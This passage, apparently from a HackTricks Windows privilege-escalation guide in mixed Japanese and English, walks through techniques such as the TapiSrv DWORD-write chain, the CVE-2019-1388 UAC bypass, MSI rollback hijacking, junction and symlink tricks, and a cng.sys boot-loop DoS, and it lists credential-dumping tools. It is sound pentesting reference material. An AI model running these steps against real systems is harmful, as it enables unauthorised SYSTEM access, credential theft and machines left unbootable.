Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェースにアクセスできる場合（via console or RDP）、かつ UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから "NT\AUTHORITY SYSTEM" のような terminal やその他のプロセスを実行することが可能です。

これにより、同一の脆弱性で特権昇格と UAC のバイパスを同時に行うことができます。さらに、何もインストールする必要はなく、プロセスで使用される binary は Microsoft によって署名・発行されています。

影響を受けるシステムの一部は次のとおりです：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

この手法は [**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) に記載されており、エクスプロイトコードは [**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) にあります。

攻撃は基本的に Windows Installer の rollback 機能を悪用して、アンインストール時に正当なファイルを悪意あるファイルに置き換えるものです。そのために攻撃者は `C:\Config.Msi` フォルダをハイジャックするための **malicious MSI installer** を作成し、後で他の MSI パッケージのアンインストール中に Windows Installer が rollback ファイルを格納する際に、その rollback ファイルが悪意あるペイロードを含むように改変されることを利用します。

要約すると手法は以下のとおりです。

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**index metadata**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION`ストリームを削除する**と、NTFSは**フォルダ全体をファイルシステムから削除します**。

これは標準的なファイル削除 APIs を使って行えます。例えば:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出していても、実際には **deletes the folder itself**。

### From Folder Contents Delete to SYSTEM EoP
もしあなたの primitive が任意の files/folders を削除できないが、**attacker-controlled folder の *contents* を削除できる**としたら？

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設置する
- oplock は、privileged process が `file1.txt` を削除しようとしたときに**execution を一時停止**させます。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガー（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock triggers** が発生し、制御はあなたのコールバックに渡ります。

4. ステップ 4: oplock コールバック内 – 削除をリダイレクト

- オプション A: `file1.txt` を別の場所へ移動する
- これにより `folder1` は空になりますが、oplock は解除されません。
- `file1.txt` を直接削除してはいけません — それは oplock を早期に解放してしまいます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納するNTFSの内部ストリームを狙っています — これを削除するとフォルダ自体が削除されます。

5. ステップ5: oplock を解放
- SYSTEM プロセスは継続して `file1.txt` を削除しようとします。
- しかし今、junction + symlink のせいで実際に削除されるのは:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除される。

### Arbitrary Folder Create から 永続的な DoS へ

次のプリミティブを悪用すると、**create an arbitrary folder as SYSTEM/admin** を実行できる — たとえ **ファイルを書き込めない** または **弱い権限を設定できない** 場合でも。

**フォルダ**（ファイルではなく）を **重要な Windows ドライバー** の名前で作成する。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` カーネルモードドライバに対応します。
- もし **事前にフォルダとして作成する** と、Windows は起動時に実際のドライバをロードできなくなります。
- その後、Windows は起動時に `cng.sys` をロードしようとします。
- フォルダを検出すると、**実際のドライバを解決できず**、**クラッシュまたは起動停止する** ことがあります。
- **フォールバックはなく**、外部の介入（例: ブート修復やディスクアクセス）なしには **復旧できません**。

### 特権ログ/バックアップパス + OM symlinks から任意ファイル上書き / boot DoS へ

特権を持つサービスが、**書き込み可能な設定**から読み取ったパスにログ/エクスポートを書き込む場合、そのパスを **Object Manager symlinks + NTFS mount points** でリダイレクトすることで、特権書き込みを任意の上書きに変えることができます（(**なくても** SeCreateSymbolicLinkPrivilege)）。

**Requirements**
- ターゲットパスを格納する設定ファイルが攻撃者によって書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` へのマウントポイントと OM ファイル symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに書き込む特権操作（ログ、エクスポート、レポートなど）が存在すること。

**Example chain**
1. 設定を読み取り、特権ログの出力先を特定する（例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`）。
2. 管理者権限なしでパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 権限の高いコンポーネントがログを書き込むのを待つ（例：管理者が「テストSMSを送信」をトリガーする）。書き込みは現在 `C:\Windows\System32\cng.sys` に行われる。
4. 上書きされたターゲット（hex/PE パーサー）を検査して破損を確認する；再起動すると Windows は改竄されたドライバパスを読み込むため → **ブートループ DoS**。これは、特権サービスが書き込みのために開く任意の保護されたファイルにも一般化される。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` にコピーが存在する場合はこちらが先に試される可能性があり、破損データに対する信頼できる DoS シンクになる。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

もし既に High Integrity のプロセスで実行中であれば、**SYSTEM へのパス**は単に**新しいサービスを作成して起動する**だけで簡単に得られる：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する際は、それが有効なサービスであること、または有効なサービスでない場合に 20 秒で終了されるため必要な動作を速やかに行うバイナリであることを確認してください。

### AlwaysInstallElevated

High Integrity プロセスから、**AlwaysInstallElevated registry entries を有効にし**、_.msi_ ラッパーを使ってリバースシェルを**インストール**してみることができます。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

コードは [**find the code here**](seimpersonate-from-high-to-system.md) を参照してください。

### From SeDebug + SeImpersonate to Full Token privileges

これらのトークン権限を持っている場合（おそらく既に High Integrity プロセスで見つかるでしょう）、SeDebug 権限を使ってほぼ任意のプロセス（protected プロセスは除く）を開き、そのプロセスのトークンをコピーして、そのトークンで任意のプロセスを作成できます。\
この手法では通常、すべてのトークン権限を持つ SYSTEM として動作しているプロセスを選択します（はい、すべてのトークン権限を持たない SYSTEM プロセスも存在します）。\
例は [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md) で確認できます。

### **Named Pipes**

この手法は meterpreter が `getsystem` を行う際に使用します。手法は、パイプを作成し、そのパイプに書き込むためにサービスを作成／悪用する、というものです。パイプを作成した **server** は **`SeImpersonate`** 権限を使ってパイプクライアント（サービス）のトークンをインパーソネートでき、SYSTEM 権限を取得できます。\
Name pipes についてさらに学びたい場合は[**learn more about name pipes you should read this**](#named-pipe-client-impersonation)を参照してください。\
name pipes を使って high integrity から System に移行する例を読みたい場合は[**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md)を参照してください。

### Dll Hijacking

もし SYSTEM として実行されているプロセスによってロードされる dll をハイジャックできれば、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の権限昇格にも有用であり、さらに high integrity プロセスからは DLL をロードするフォルダに対する書き込み権限があるため、達成がはるかに容易です。\
詳細は [**learn more about Dll hijacking here**](dll-hijacking/index.html) を参照してください。

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 追加のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windows のローカル権限昇格ベクタを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルをチェックします（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの設定ミスのチェックや情報収集を行います（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、および RDP の保存されたセッション情報を抽出します。ローカルで -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ベースの ADIDNS/LLMNR/mDNS スプーファー兼 MITM ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows 権限昇格用の列挙ツール**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の権限昇格脆弱性を検索します（Watson に置換され非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の権限昇格脆弱性を検索します（VisualStudio でのコンパイルが必要です） ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して設定ミスを探します（権限昇格というより情報収集ツール）（コンパイルが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（GitHub に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp を C# に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスをチェックします（実行ファイルは GitHub にプリコンパイル済み）。推奨しません。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 設定ミスをチェックします（Python からの exe）。推奨しません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツールです（accesschk がなくても動作しますが、使用可能です）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み、動作するエクスプロイトを推奨します（ローカル Python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み、動作するエクスプロイトを推奨します（ローカル Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET を使ってコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには次を実行できます：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA マクロ phishing を SMTP 経由で → hMailServer の credential を復号 → Veeam CVE-2023-27532 による SYSTEM 取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) および kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: カーネルの影における猫と鼠の駆け引き](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – SCADA システムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink の使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Windows における Symbolic Links の悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
